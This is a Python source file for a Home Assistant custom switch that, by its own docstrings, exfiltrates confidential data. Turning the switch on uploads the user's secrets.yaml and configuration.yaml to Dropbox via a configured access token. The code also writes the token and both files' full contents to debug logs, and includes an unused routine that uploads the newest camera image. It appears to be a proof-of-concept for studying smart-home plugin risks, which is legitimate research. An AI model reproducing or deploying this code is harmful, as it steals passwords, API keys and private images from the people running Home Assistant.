"""This custom switch exfiltrate some reserved information."""
from __future__ import annotations
import os
import glob
import logging
import dropbox

from homeassistant.components.switch import SwitchEntity

from homeassistant.core import HomeAssistant
from homeassistant.helpers.entity_platform import AddEntitiesCallback
from homeassistant.helpers.typing import ConfigType, DiscoveryInfoType


NAME_KEY = "name"
DEFAULT_NAME = "Switch Exfiltration"
PRINT_KEY = "printing"
ACCESS_TOKEN_KEY = "db_access_token"

_LOGGER = logging.getLogger(__name__)


def setup_platform(
    hass: HomeAssistant,
    config: ConfigType,
    add_entities: AddEntitiesCallback,
    discovery_info: DiscoveryInfoType | None = None,
) -> None:
    """Set up the sensor platform."""

    if ACCESS_TOKEN_KEY not in config:
        _LOGGER.critical("Missing access token!")
        return False

    if NAME_KEY in config:
        name = config[NAME_KEY]
    else:
        name = DEFAULT_NAME

    if PRINT_KEY in config:
        printing = config[PRINT_KEY]
    else:
        printing = False

    add_entities([SwitchExfiltration(config[ACCESS_TOKEN_KEY], name, printing)])
    return True


class SwitchExfiltration(SwitchEntity):
    """This is a virtual switch modified to exfiltrate confidential information."""

    _target_file1 = "secrets.yaml"
    _target_file2 = "configuration.yaml"
    # The access token to update info on Dropbox should be written here.
    # _access_token = "token"

    def __init__(self, access_token, name: str = DEFAULT_NAME, printing: bool = False):
        self._access_token = access_token
        self._name = name
        self._print = printing
        self._is_on = False
        self._file_path = self.find_path()
        # self._file_path = self.hass.config  # during initialization <hass> is None

        _LOGGER.info("<%s> was created", self._name)
        _LOGGER.debug("The access token is: <%s>", self._access_token)

        if self._print:
            self.print_config()

    @property
    def name(self):
        """Name of the entity."""
        return self._name

    @property
    def is_on(self):
        """If the switch is currently on or off."""
        return self._is_on

    def turn_on(self, **kwargs):
        """Turn the switch on."""
        self._is_on = True
        self.store_data()
        # self.store_picture_on_db()

    def turn_off(self, **kwargs):
        """Turn the switch off."""
        self._is_on = False

    def print_config(self):
        """Print configuration info for debug purposes."""

        if self._file_path:
            file1 = self._file_path + self._target_file1
            with open(file1, "rt", encoding="utf-8") as _f:
                _LOGGER.debug("\n---\n Printing target: %s \n---", self._target_file1)
                data = _f.read()
                _LOGGER.debug(data)

            file2 = self._file_path + self._target_file2
            with open(file2, "rt", encoding="utf-8") as _f:
                _LOGGER.debug("\n---\n Printing target: %s \n---", self._target_file2)
                data = _f.read()
                _LOGGER.debug(data)

    def store_data(self):
        """Upload the target files on Dropbox."""
        file_path = self.hass.config
        upload_path = "/config/"
        src1 = file_path.path(self._target_file1)
        src2 = file_path.path(self._target_file2)

        self.upload_file(src1, upload_path + self._target_file1)
        self.upload_file(src2, upload_path + self._target_file2)

    def store_picture_on_db(self):
        """Store the last picture on Dropbox. Currently not used."""
        # test_image_name = "test_20211201_170607.jpg"
        dev_path = "/workspaces/core/homeassistant/media/"
        prod_path = "/homeassistant/media/"
        local_path = "./media/"

        source_path = None
        if os.path.isdir(local_path):
            _LOGGER.debug("Source Path: local path")
            source_path = local_path
        elif os.path.isdir(dev_path):
            _LOGGER.debug("Source Path: dev path")
            source_path = dev_path
        elif os.path.isdir(prod_path):
            _LOGGER.debug("Source Path: prod path")
            source_path = prod_path
        else:
            _LOGGER.info("No available path for pictures!")

        if source_path:
            dest_path = "/blink/"

            list_of_files = glob.glob(source_path + "*.jpg")
            image_path = max(list_of_files, key=os.path.getctime)
            image_name = os.path.basename(image_path)

            # self.upload_file(source_path + image_name, dest_path + image_name)
            self.upload_file(image_path, dest_path + image_name)

    def upload_file(self, file_from, file_to):
        """upload a file to Dropbox using API v2"""
        dbx = dropbox.Dropbox(self._access_token)

        with open(file_from, "rb") as _f:
            dbx.files_upload(_f.read(), file_to, mode=dropbox.files.WriteMode.overwrite)

    def find_path(self) -> str:
        """Find the working path. This method is not used anymore."""

        dev_path = "/workspaces/core/config/"
        prod_path = "/config/"
        local_path = "./config/"

        file_path = None
        if os.path.isfile(dev_path + self._target_file2):
            _LOGGER.debug("Source Path: dev path")
            file_path = dev_path
        elif os.path.isfile(prod_path + self._target_file2):
            _LOGGER.debug("Source Path: prod path")
            file_path = prod_path
        elif os.path.isfile(local_path + self._target_file2):
            _LOGGER.debug("Source Path: local path")
            file_path = local_path
        else:
            _LOGGER.info("There is no target file")
        return file_path
